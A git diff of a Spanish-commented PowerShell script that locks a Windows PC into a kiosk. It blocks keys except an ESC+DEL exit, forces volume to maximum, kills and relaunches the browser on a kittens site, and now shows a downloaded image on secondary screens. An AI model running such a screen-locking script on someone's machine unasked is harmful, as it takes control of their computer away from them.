@@ -1,13 +1,22 @@
 <#
-  run.ps1 - Video en TODAS las pantallas (con audio en ambas)
+  run.ps1 - Principal: video | Secundarias: imagen
   Única salida: ESC + DEL
 #>
 
 $ErrorActionPreference = 'SilentlyContinue'
 $ProgressPreference    = 'SilentlyContinue'
 
-$pageUrl = 'https://gatitos-eight.vercel.app'
+$pageUrl    = 'https://gatitos-eight.vercel.app'
+$imagenUrl  = 'https://i.pinimg.com/736x/cc/ff/b9/ccffb9e77fe53c5de91d92770b04c28f.jpg'
 $basePerfil = Join-Path $env:TEMP 'venice_kiosk'
+$imagenPath = Join-Path $env:TEMP 'secundaria.jpg'
+
+# Descargar la imagen
+try {
+  (New-Object Net.WebClient).DownloadFile($imagenUrl, $imagenPath)
+} catch {
+  Write-Host "No se pudo descargar la imagen"
+}
 
 # ---------------- Bloqueo de teclas + ESC+DEL ----------------
 Add-Type -TypeDefinition @'
@@ -97,43 +106,50 @@ public static class Vol {
 }
 '@
 
-# ---------------- API ventanas ----------------
-Add-Type -TypeDefinition @'
-using System;
-using System.Runtime.InteropServices;
-
-public class WinAPI {
-  public static readonly IntPtr HWND_TOPMOST = new IntPtr(-1);
-  public const uint SWP_SHOWWINDOW = 0x0040;
-  public const uint SWP_FRAMECHANGED = 0x0020;
-  public const int GWL_STYLE = -16;
-  public const int GWL_EXSTYLE = -20;
-  public const int WS_CAPTION = 0x00C00000;
-  public const int WS_THICKFRAME = 0x00040000;
-  public const int WS_BORDER = 0x00800000;
-  public const int WS_SYSMENU = 0x00080000;
-  public const int WS_EX_TOPMOST = 0x00000008;
-
-  [DllImport("user32.dll")]
-  public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
-
-  [DllImport("user32.dll")]
-  public static extern int GetWindowLong(IntPtr hWnd, int nIndex);
-
-  [DllImport("user32.dll")]
-  public static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);
-
-  [DllImport("user32.dll")]
-  public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-
-  public const int SW_SHOW = 5;
-}
-'@
-
+# ---------------- Pantallas con imagen ----------------
 Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+
 $screens = [System.Windows.Forms.Screen]::AllScreens
 $primary = [System.Windows.Forms.Screen]::PrimaryScreen
+$script:imageForms = @()
 
+function CrearPantallasImagen {
+  foreach ($f in $script:imageForms) {
+    try { $f.Close(); $f.Dispose() } catch {}
+  }
+  $script:imageForms = @()
+
+  if (-not (Test-Path $imagenPath)) { return }
+
+  $img = [System.Drawing.Image]::FromFile($imagenPath)
+
+  foreach ($screen in $screens) {
+    if ($screen.DeviceName -eq $primary.DeviceName) { continue }
+
+    $form = New-Object System.Windows.Forms.Form
+    $form.FormBorderStyle = 'None'
+    $form.StartPosition = 'Manual'
+    $form.Location = $screen.Bounds.Location
+    $form.Size = $screen.Bounds.Size
+    $form.TopMost = $true
+    $form.ShowInTaskbar = $false
+    $form.Cursor = [System.Windows.Forms.Cursors]::None
+    $form.BackColor = [System.Drawing.Color]::Black
+
+    $pb = New-Object System.Windows.Forms.PictureBox
+    $pb.Dock = 'Fill'
+    $pb.SizeMode = 'Zoom'          # o 'StretchImage' si quieres que llene todo
+    $pb.Image = $img
+    $form.Controls.Add($pb)
+
+    $form.Show()
+    $form.Activate()
+    $script:imageForms += $form
+  }
+}
+
+# ---------------- Navegador (solo principal) ----------------
 function Get-Nav {
   $c = @(
     "$env:ProgramFiles\Microsoft\Edge\Application\msedge.exe",
@@ -149,74 +165,28 @@ function Get-Nav {
 $nav = Get-Nav
 if (-not $nav) { Write-Host "No se encontró Edge ni Chrome"; exit }
 $procName = [IO.Path]::GetFileNameWithoutExtension($nav)
+$script:browserPid = 0
 
-$script:windowMap = @{}
-
-function ForzarFullscreen($hwnd, $screen) {
-  if ($hwnd -eq [IntPtr]::Zero) { return }
-
-  $style = [WinAPI]::GetWindowLong($hwnd, [WinAPI]::GWL_STYLE)
-  $style = $style -band (-bnot [WinAPI]::WS_CAPTION) -band (-bnot [WinAPI]::WS_THICKFRAME) -band (-bnot [WinAPI]::WS_BORDER) -band (-bnot [WinAPI]::WS_SYSMENU)
-  [WinAPI]::SetWindowLong($hwnd, [WinAPI]::GWL_STYLE, $style) | Out-Null
-
-  $exStyle = [WinAPI]::GetWindowLong($hwnd, [WinAPI]::GWL_EXSTYLE)
-  $exStyle = $exStyle -bor [WinAPI]::WS_EX_TOPMOST
-  [WinAPI]::SetWindowLong($hwnd, [WinAPI]::GWL_EXSTYLE, $exStyle) | Out-Null
-
-  [WinAPI]::SetWindowPos($hwnd, [WinAPI]::HWND_TOPMOST, $screen.Bounds.X, $screen.Bounds.Y, $screen.Bounds.Width, $screen.Bounds.Height, [WinAPI]::SWP_SHOWWINDOW -bor [WinAPI]::SWP_FRAMECHANGED) | Out-Null
-  [WinAPI]::ShowWindow($hwnd, [WinAPI]::SW_SHOW) | Out-Null
-}
-
-function LanzarTodo {
+function LanzarNavegador {
   Get-Process -Name $procName -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
-  Start-Sleep -Milliseconds 700
-  $script:windowMap = @{}
+  Start-Sleep -Milliseconds 400
 
-  $index = 0
-  foreach ($screen in $screens) {
-    $index++
-    $perfil = "$basePerfil`_$index"
-    $isPrimary = ($screen.DeviceName -eq $primary.DeviceName)
-    $x = $screen.Bounds.X
-    $y = $screen.Bounds.Y
-    $w = $screen.Bounds.Width
-    $h = $screen.Bounds.Height
+  $perfil = "$basePerfil`_main"
+  $flags = "--kiosk `"$pageUrl`" --user-data-dir=`"$perfil`" --no-first-run " +
+           "--no-default-browser-check --disable-session-crashed-bubble --noerrdialogs " +
+           "--autoplay-policy=no-user-gesture-required --disable-infobars"
+  if ($nav -match 'msedge') { $flags += ' --edge-kiosk-type=fullscreen' }
 
-    if ($isPrimary) {
-      $flags = "--kiosk `"$pageUrl`" --user-data-dir=`"$perfil`" --no-first-run " +
-               "--no-default-browser-check --disable-session-crashed-bubble --noerrdialogs " +
-               "--autoplay-policy=no-user-gesture-required --disable-infobars"
-      if ($nav -match 'msedge') { $flags += ' --edge-kiosk-type=fullscreen' }
-    } else {
-      $flags = "--new-window --app=`"$pageUrl`" --user-data-dir=`"$perfil`" " +
-               "--no-first-run --disable-session-crashed-bubble --disable-infobars " +
-               "--autoplay-policy=no-user-gesture-required " +
-               "--window-position=$x,$y --window-size=$w,$h"
-    }
-
-    $p = Start-Process -FilePath $nav -ArgumentList $flags -PassThru
-    if ($p) { $script:windowMap[$p.Id] = @{ Screen = $screen; IsPrimary = $isPrimary } }
-    Start-Sleep -Milliseconds 900
-  }
-
-  # Forzar secundarias muchas veces al inicio
-  for ($t = 1; $t -le 15; $t++) {
-    Start-Sleep -Milliseconds 250
-    foreach ($pid in @($script:windowMap.Keys)) {
-      $info = $script:windowMap[$pid]
-      if (-not $info.IsPrimary) {
-        $proc = Get-Process -Id $pid -ErrorAction SilentlyContinue
-        if ($proc -and $proc.MainWindowHandle -ne [IntPtr]::Zero) {
-          ForzarFullscreen $proc.MainWindowHandle $info.Screen
-        }
-      }
-    }
-  }
+  $p = Start-Process -FilePath $nav -ArgumentList $flags -PassThru
+  if ($p) { $script:browserPid = $p.Id }
 }
 
 # ========== INICIO ==========
 [KeyBlocker]::Start()
-LanzarTodo
+
+CrearPantallasImagen
+LanzarNavegador
+Start-Sleep -Milliseconds 1000
 
 try {
   while ($true) {
@@ -224,31 +194,31 @@ try {
 
     [Vol]::Set(1.0)
 
-    # Mantener secundarias en fullscreen
-    foreach ($pid in @($script:windowMap.Keys)) {
-      $info = $script:windowMap[$pid]
-      if (-not $info.IsPrimary) {
-        $proc = Get-Process -Id $pid -ErrorAction SilentlyContinue
-        if ($proc -and $proc.MainWindowHandle -ne [IntPtr]::Zero) {
-          ForzarFullscreen $proc.MainWindowHandle $info.Screen
-        }
-      }
+    # Mantener las imágenes visibles
+    foreach ($f in $script:imageForms) {
+      try {
+        if (-not $f.Visible) { $f.Show() }
+        $f.TopMost = $true
+      } catch {}
     }
 
-    # ¿Falta alguna?
-    $vivos = 0
-    foreach ($pid in @($script:windowMap.Keys)) {
-      if (Get-Process -Id $pid -ErrorAction SilentlyContinue) { $vivos++ }
+    # Si se cerró el navegador → reabrir
+    $vivo = $false
+    if ($script:browserPid -gt 0) {
+      $vivo = [bool](Get-Process -Id $script:browserPid -ErrorAction SilentlyContinue)
+    }
+    if (-not $vivo) {
+      LanzarNavegador
+      Start-Sleep -Milliseconds 800
     }
 
-    if ($vivos -lt $screens.Count) {
-      LanzarTodo
-    }
-
-    Start-Sleep -Milliseconds 100
+    Start-Sleep -Milliseconds 120
   }
 }
 finally {
   [KeyBlocker]::Stop()
   Get-Process -Name $procName -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+  foreach ($f in $script:imageForms) {
+    try { $f.Close(); $f.Dispose() } catch {}
+  }
 }
